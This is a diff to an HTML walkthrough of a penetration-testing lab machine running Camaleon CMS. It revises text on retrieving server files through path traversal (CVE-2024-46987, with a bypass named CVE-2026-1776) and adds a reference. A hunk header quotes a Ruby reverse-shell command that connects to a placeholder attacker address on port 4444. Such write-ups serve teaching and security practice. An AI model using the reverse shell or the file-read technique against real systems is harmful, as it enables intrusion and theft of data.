@@ -346,9 +346,9 @@ dragonballz      (id_ed25519)</code>
 
       <p>Next, we attempted to determine which user the private key belonged to.</p>
 
-      <p>During our research, we discovered a technique to retrieve server-side files via the web server. This endpoint
-        was described in an article on <strong>CVE-2024-46987</strong>, which affects later versions than the one
-        running on the target <a class="ref" href="#references">[2]</a>.</p>
+      <p>During our research, we found the path traversal vulnerability <strong>CVE-2024-46987</strong> <a class="ref" href="#references">[2]</a>, which affects previous versions of Camaleon CMS than the one used on the target. Although the target server was not technically vulnerable to this CVE, we were still able to exploit it and retrieve server-side files.</p>
+
+      <p><div class="update"><strong>Update:</strong> This behaviour is due to a recently discovered vulnerability affecting the version of Camaleon CMS used on the target machine. The vulnerability is identified as <strong>CVE-2026-1776</strong> and is related to the AWS S3 uploader implementation, representing a bypass of the previous fix for CVE-2024-46987.<a class="ref" href="#references">[5]</a></div></p>
 
       <p>Despite the version difference, we tested the technique and successfully retrieved the <code>/etc/passwd</code>
         file from the server.</p>
@@ -448,6 +448,11 @@ echo 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("OUR_IP_ADDRESS",4444))'> /tmp/e
           <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">4</span>]</span>
           <a href="https://gtfobins.org/gtfobins/facter" target="_blank" rel="noopener noreferrer">
             GTFOBins | Facter</a>
+        </li>
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">5</span>]</span>
+          <a href="https://github.com/advisories/GHSA-jw5g-f64p-6x78" target="_blank" rel="noopener noreferrer">
+            GitHub | CVE-2026-1776  - Path Traversal through AWS S3 uploader implementation </a>
         </li>
 
       </ol>
